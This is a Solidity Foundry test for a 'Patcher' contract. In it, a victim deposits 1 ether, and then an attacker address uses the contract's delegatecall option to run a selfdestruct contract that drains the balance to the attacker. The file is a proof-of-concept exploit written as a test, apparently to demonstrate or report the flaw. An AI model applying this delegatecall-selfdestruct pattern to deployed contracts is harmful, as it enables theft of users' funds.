// SPDX-License-Identifier: LGPL-3.0
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {Patcher} from "../../../src/Periphery/Patcher.sol";

contract DummyValueSource {
    function getValue() external pure returns (uint256) {
        return 0;
    }
}

contract DummyTarget {
    function process(uint256 /*value*/ ) external payable {}
}

contract SelfDestructContract {
    function destroy(uint256 /*unused*/ ) external payable {
        selfdestruct(payable(msg.sender));
    }
}

contract PatcherSelfDestructTest is Test {
    Patcher internal patcher;
    DummyValueSource internal valueSource;
    DummyTarget internal target;
    SelfDestructContract internal selfDestruct;
    address internal victim = address(0x1);
    address internal attacker = address(0x2);

    function setUp() public {
        patcher = new Patcher();
        valueSource = new DummyValueSource();
        target = new DummyTarget();
        selfDestruct = new SelfDestructContract();
        vm.deal(victim, 1 ether);
    }

    function test_PatcherDelegatecallAllowsSelfDestruct() public {
        bytes memory originalCalldata = abi.encodeWithSelector(
            target.process.selector,
            uint256(0)
        );
        uint256[] memory offsets = new uint256[](1);
        offsets[0] = 4;
        bytes memory getter = abi.encodeWithSelector(
            valueSource.getValue.selector
        );

        vm.prank(victim);
        patcher.executeWithDynamicPatches{value: 1 ether}(
            address(valueSource),
            getter,
            address(target),
            0,
            originalCalldata,
            offsets,
            false
        );
        assertEq(address(patcher).balance, 1 ether);

        bytes memory destroyData = abi.encodeWithSelector(
            selfDestruct.destroy.selector,
            uint256(0)
        );
        uint256[] memory destroyOffsets = new uint256[](1);
        destroyOffsets[0] = 4;

        vm.prank(attacker);
        patcher.executeWithDynamicPatches(
            address(valueSource),
            getter,
            address(selfDestruct),
            0,
            destroyData,
            destroyOffsets,
            true
        );
        assertEq(attacker.balance, 1 ether);
    }
}

